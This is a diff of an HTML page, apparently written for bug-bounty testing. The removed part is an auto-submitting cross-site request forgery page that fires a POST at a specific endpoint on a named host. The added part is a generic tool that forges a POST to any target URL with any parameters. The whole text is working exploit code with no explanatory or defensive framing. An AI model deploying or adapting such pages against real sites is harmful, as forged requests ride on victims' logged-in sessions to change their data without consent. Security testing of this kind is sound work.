@@ -1,11 +1,56 @@
-<!-- csrf-poc.html -->
+<!DOCTYPE html>
 <html>
-  <body>
-    <h1>CSRF Test – Do Not Close</h1>
-    <form id="csrfForm" method="POST" action="https://intigriti.ilias-solutions.com/intigriti/moplan/rest/moplan/monthlyPlanAsset/ratio">
-    </form>
-    <script>
-      document.getElementById("csrfForm").submit();
-    </script>
-  </body>
+<head>
+  <title>CSRF PoC Tool</title>
+</head>
+<body>
+  <h2>🧪 CSRF PoC Tool</h2>
+  <form id="inputForm">
+    <label for="target">Target URL (POST):</label><br>
+    <input type="text" id="target" name="target" placeholder="https://example.com/path" size="80" required><br><br>
+
+    <label for="params">Custom parameters (optional):</label><br>
+    <textarea id="params" name="params" placeholder="key1=value1&key2=value2" rows="4" cols="80"></textarea><br><br>
+
+    <button type="submit">Send CSRF</button>
+  </form>
+
+  <hr>
+
+  <form id="csrfForm" method="POST" target="_blank">
+    <!-- Dynamic fields will be inserted here -->
+  </form>
+
+  <script>
+    document.getElementById("inputForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const target = document.getElementById("target").value;
+      const rawParams = document.getElementById("params").value;
+
+      const form = document.getElementById("csrfForm");
+      form.action = target;
+
+      // Clear previous inputs
+      while (form.firstChild) form.removeChild(form.firstChild);
+
+      // Add hidden fields if params are provided
+      if (rawParams.trim()) {
+        const pairs = rawParams.split("&");
+        pairs.forEach(pair => {
+          const [key, value] = pair.split("=");
+          if (key) {
+            const input = document.createElement("input");
+            input.type = "hidden";
+            input.name = decodeURIComponent(key.trim());
+            input.value = decodeURIComponent((value || "").trim());
+            form.appendChild(input);
+          }
+        });
+      }
+
+      form.submit();
+    });
+  </script>
+</body>
 </html>
